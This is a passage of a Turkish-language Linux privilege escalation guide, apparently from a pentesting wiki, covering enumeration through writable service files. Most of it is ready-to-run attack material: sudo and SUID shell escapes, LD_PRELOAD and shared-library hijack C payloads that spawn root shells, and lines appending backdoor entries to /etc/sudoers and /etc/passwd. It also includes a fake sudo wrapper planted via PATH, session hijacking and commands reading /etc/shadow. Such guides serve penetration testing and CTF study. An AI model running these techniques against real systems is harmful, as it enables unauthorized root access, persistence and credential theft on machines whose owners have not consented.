cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Makinaya erişmeden önce etkileşim kuramadığınız ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer sniff yapabiliyorsanız, bazı credentials elde edebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kontrol edin **kim** olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **giriş** yapabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalıkları verebilecek herhangi bir grubun **üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Panonun içinde ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir **parolasını biliyorsanız**, bu parolayı kullanarak **her kullanıcı için giriş yapmayı deneyin**.

### Su Brute

Çok fazla gürültü oluşturmayı umursamıyorsanız ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıya brute-force uygulamayı deneyebilirsiniz.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcıları brute-force etmeyi dener.

## Yazılabilir PATH kötüye kullanımları

### $PATH

Eğer $PATH içindeki herhangi bir klasöre **yazabildiğinizi** fark ederseniz, ayrı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutla aynı ada sahip bir backdoor'u **yazılabilir klasörün içine oluştururarak** ayrıcalıkları yükseltebilirsiniz ve bunun için bu komutun $PATH içinde yazılabilir klasörünüzden **önceki bir klasörden yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları sudo ile çalıştırma izniniz olabilir veya komutların suid biti setlenmiş olabilir. Bunun için şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmeyen komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla parolasını bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo`, `root` olarak `vim` çalıştırabiliyor; root dizinine bir ssh key ekleyerek veya `sh` çağırarak bir shell elde etmek artık çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge kullanıcıya bir şey çalıştırırken **bir ortam değişkeni ayarlama** imkânı verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayanan**, script root olarak çalıştırılırken bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e karşı **savunmasızdı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo yürütme atlatma yolları

**Jump** diğer dosyaları okumak veya **symlinks** kullanmak için. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu olmadan

Eğer **sudo permission** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **komutun yolunu belirtmeden başka bir komutu çalıştırıyorsa (her zaman garip bir SUID binary içeriğini kontrol etmek için** _**strings**_ **kullanın)**).

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komutu çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı isimde bir fonksiyon oluşturup **export a function** etmeyi deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'yi çağırdığınızda, bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** ortam değişkeni, loader tarafından diğer tüm kütüphanelerden önce yüklenmesi için bir veya daha fazla paylaşımlı kütüphane (.so dosyası) belirtmek amacıyla kullanılır; bunun içine standart C kütüphanesi (`libc.so`) de dahildir. Bu işlem kütüphane ön-yükleme (preloading) olarak bilinir.

Ancak, sistem güvenliğini korumak ve özellikle **suid/sgid** çalıştırılabilir dosyalarla bu özelliğin kötüye kullanılmasını engellemek için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkili kullanıcı kimliği (_euid_) eşleşmeyen çalıştırılabilir dosyalar için **LD_PRELOAD**'u göz ardı eder.
- suid/sgid olan çalıştırılabilir dosyalar için, yalnızca standart yollarda bulunan ve aynı zamanda suid/sgid olan kütüphaneler ön-yüklenir.

Privilege escalation, eğer `sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa meydana gelebilir. Bu yapılandırma, komutlar `sudo` ile çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kodun yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra bunu **derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable kontrolüne sahipse kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Garip görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşılması, potansiyel bir istismara işaret eder.

Bunu istismar etmek için, örneğin _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturarak aşağıdaki kodu içerecek şekilde ilerlenir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle edip yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını shared object (.so) dosyası olarak şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle library'i o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) yerel güvenlik kısıtlamalarını aşmak için bir saldırgan tarafından sömürülebilecek Unix ikili dosyalarının derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir komutta **yalnızca argüman enjekte edebildiğiniz** durumlar için aynıdır.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl sömürebileceğini kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

Şifreye sahip olmadığınız ama **sudo erişiminiz** olduğu durumlarda, bir sudo komutunun çalıştırılmasını **bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten _sampleuser_ kullanıcısı olarak bir shell'e sahip olmalısınız
- _sampleuser_ son **15 dakika** içinde bir şey çalıştırmak için **`sudo` kullanmış olmalı** (varsayılan olarak bu, şifre girmeden `sudo` kullanmamıza izin veren sudo tokenının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf`'u değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Tüm bu gereksinimler karşılanıyorsa, **ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- İlk **exploit** (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturacak. Bunu oturumunuzdaki sudo tokenını **aktifleştirmek** için kullanabilirsiniz (otomatik olarak bir root shell alamazsınız, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root'a ait ve setuid ile** bir sh shell oluşturacak
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers dosyası oluşturacak** ve bu dosya **sudo tokenlerini süresiz hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulmuş herhangi bir dosyada **yazma izinlerine** sahipseniz [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ikilisini kullanarak **bir kullanıcı ve PID için sudo token oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve PID'si 1234 olan o kullanıcı olarak bir shell'e sahipseniz, şifreyi bilmenize gerek olmadan **sudo ayrıcalıklarını elde edebilirsiniz** şu işlemi yaparak:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** **bazı ilginç bilgiler edinebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** ayrıcalıkları **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Eğer yazabiliyorsanız, bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` ikili dosyasına bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp yetki yükseltmek için `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, root olarak kodunuzu çalıştırıp sonra kullanıcının komutunu çalıştıracak bir **yeni sudo yürütülebilir dosyası** oluşturabilirsiniz. Sonra kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu .bash_profile içine ekleyerek) değiştirin; böylece kullanıcı sudo komutunu çalıştırdığında sizin sudo yürütülebilir dosyanız çalıştırılır.

Kullanıcının farklı bir shell (bash değil) kullanması durumunda yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şöyle bir şeyi çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının kaynaklarını gösterir**. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **diğer klasörleri işaret eder**; bu klasörlerde **kütüphaneler** **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir**.

Eğer herhangi bir nedenle belirtilen yollardan herhangi birine **bir kullanıcının yazma izni** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, o kullanıcı yetki yükseltmesi gerçekleştirebilir.\
Aşağıdaki sayfada bu yanlış yapılandırmanın **nasıl istismar edileceğine** göz atın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği üzere program bu konumdaki lib'i kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içine kötü amaçlı bir kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece mevcut root ayrıcalıklarının bir **alt kümesini sağlar**. Bu, root **ayrıcalıklarını daha küçük ve ayrı birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tam kümesi azaltılır ve exploitation riskleri düşer.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında ve bunların nasıl abuse edileceği hakkında daha fazla bilgi edinin**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **bit for "execute"** etkilenen kullanıcının "**cd**" ile klasöre girebileceği anlamına gelir.\
**"read"** biti kullanıcının **files**'ları **list** edebileceğini, ve **"write"** biti kullanıcının **files**'ları **delete** ve **create** edebileceğini ifade eder.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve **overriding the traditional ugo/rwx permissions** yeteneğine sahiptir. Bu izinler, sahip olmayan veya grup üyesi olmayan belirli kullanıcılara haklar verip reddederek dosya veya dizin erişimi üzerinde kontrolü artırır. Bu düzeydeki **granularity daha kesin erişim yönetimi sağlar**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Elde et** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** yalnızca **kendi kullanıcı hesabınızın** **screen sessions**'larına **connect** olabilirsiniz. Ancak, **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen sessions listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Ayrıcalıklı olmayan bir kullanıcı olarak, root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** için bir örneğe bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulaması izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

root'un ssh ile oturum açıp açamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` veya `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : hayır

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bunlar home dizini ile değiştirilir. **Mutlak yolları belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının home dizininden göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer kullanıcı "**testusername**"ın **private** anahtarıyla giriş yapmayı denerseniz, ssh anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda anahtarları (without passphrases!) bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanıza olanak tanır. Böylece ssh ile **jump** **to a host** yapabilir ve oradan **jump to another** **host**a, **initial host**'unuzda bulunan **key**i **using** ederek ulaşabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat edin ki eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o makine anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu seçenekleri **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config`, `AllowAgentForwarding` anahtar kelimesi ile ssh-agent yönlendirmesine **izin verebilir** veya **engelleyebilir** (varsayılan izin ver).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak yetki yükseltmesi yapabilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında **çalıştırılan betiklerdir**. Bu nedenle, eğer bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız yetki yükseltmesi yapabilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi tuhaf bir profile script bulunursa bunu **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle olabilir veya bir yedeği bulunabilir. Bu yüzden **tümünü bulun** ve içlerinde **hashes** olup olmadığını görmek için **okuyup okuyamadığınızı kontrol edin**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasında **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Öncelikle, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan bir sahte kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd`'de bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatılışında çalıştırılacaktır.

### Klasörleri Kontrol Edin

